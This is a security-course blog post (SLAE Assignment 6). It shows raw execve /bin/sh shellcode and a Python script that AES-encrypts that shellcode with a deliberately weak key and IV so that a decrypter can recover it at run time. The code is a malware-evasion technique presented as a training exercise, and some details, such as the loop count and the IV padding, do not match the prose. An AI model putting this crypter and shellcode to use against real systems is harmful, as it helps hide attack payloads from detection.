---
layout: single
title: SLAE Assignment 6 -- Polymorphic Shellcode
date: 2019-5-13
classes: wide
header:
  teaser: /assets/images/SLAE/SLAE.jpg
tags:
  - SLAE
  - Linux
  - x86
  - shellcoding
  - encryption
  - AES
  - python
--- 
![](/assets/images/SLAE/SLAE.jpg)

## Custom Crypter 

For this assignment the goal is create a custom encryption/decryption scheme for our shellcode. This assignment was a lot of fun. I didn't want to do something boring, so I tried to incorporate some hacker lore into my encryption scheme. 

I liked the idea that Mr. Ramachandran discussed about Hyperion how it uses a weak encryption scheme and then brute forces its own key at run time, so I tried to execute something vaguely similar with AES by just making my key and initialization vector (IV) extremely weak. 

## Encryption Code

Essentially, the encryption scheme creates an initialization vector as follows:
+ generates a list of `10` random integers between `1` and `1337`,
+ takes the 5th and 9th number in the list and averages them,
+ removes any decimal places, and
+ converts the `int` to a `str` and adds the appropriate size padding to make the IV 16 bytes. 

For key generation, the encryption scheme randomly selects one of the following names:
+ Kate Libby,
+ Ramon Sanchez, 
+ Paul Cook,
+ Eugene Belford,
+ Dade Murphy,
+ Joey Pardella, and
+ Emmanuel Goldstein.

The names have been altered slightly to account for the 16 byte size requirement for AES keys. 

For the actual encryption, I used modules from the pycrypt library such as `from Crypto.Cipher import AES` and `from Crypto.Random import random`. 

Our shellcode is `execve /bin/sh`, 
```terminal_session
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

Our shellcode length was only 25 bytes, and AES has a requirement for multiples of 16 for its data length so I used some dynamic padding with `\xff` bytes. 

When run, the encryption scheme will tell you how many bytes of padding it added so that the decryption program can know how many bytes to cut off the end. 

## Encryption Code

The code below has been heavily commented so you can follow along. Let's have some fun!

```python
from Crypto.Cipher import AES
from Crypto.Random import random
import random
import heapq
import statistics

shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

#Let's generate 10 random numbers, 1-1337
seed = []
for i in range (9):
	seed.append(random.randrange(1,1337,1))

#Let's take the 5th and 9th number in that list (5/9)
fiveNineList = [seed[4], seed[8]]

#Let's average those two numbers
def average(fiveNineList): 
	return sum(fiveNineList) / len(fiveNineList)

iv = average(fiveNineList)

#Let's just cut off any decimal places &make it a string
iv = int(iv)
iv = str(iv)

#list of famous hackers (16 byte ready)
nameList = ["Kate Libby123456", "Ramon Sanchez123", "Paul Cook1234567", "Eugene Belford12", "Dade Murphy12345", "Joey Pardella123", "E Goldstein12345"]

key = random.choice(nameList)

#Let's get our iv up to 16 bytes
ivPadding = 16 - len(iv)

if ivPadding == 12:
	iv = "This is padd" + iv

elif ivPadding == 13:
	iv = "This is paddi" + iv

elif ivPadding == 14:
	iv = "This is paddin" + iv

elif ivPadding == 15:
	iv = "This is padding" + iv

#Let's get our shellcode up to 32 bytes (has to be multiple of 16)

shellPad = 32 - len(shellcode)

shellPadBytes = b'\xff' * shellPad

shellcode = shellcode + shellPadBytes

#This is where we do our actual encryption!
aes = AES.new(key, AES.MODE_CBC, iv)
data = shellcode
encd = aes.encrypt(data)

#Let's get it into printable format!
output = "" 

for x in bytearray(encd):
	output += "\\x"
	output += '%02x'% x

#Here, we're just printing the encrypted shellcode and describing the 'Offset' which is just the number of 0xff's we added to the end of the encrypted string so that our decrypter can take those off.
print("Encoded Shellcode: " + output)
print("Offset: " + str(shellPad))
```

## Github

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1458

You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment6)
